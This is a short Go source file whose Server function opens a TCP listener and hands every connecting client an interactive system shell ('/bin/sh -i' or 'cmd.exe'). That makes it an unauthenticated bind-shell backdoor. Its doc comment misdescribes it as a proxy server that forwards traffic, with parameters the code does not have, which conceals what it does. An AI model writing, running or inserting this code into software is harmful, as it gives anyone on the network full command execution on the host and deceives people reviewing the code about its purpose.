package execute

import (
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"runtime"
)

// Server create a Proxy server on listenPort to forward traffic to target and targetPort
func Server(port int) {

	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}

func handle(conn net.Conn) {
	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd.exe", "-i")
	case "linux":
		cmd = exec.Command("/bin/sh", "-i")
	}
	rp, wp := io.Pipe()

	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}
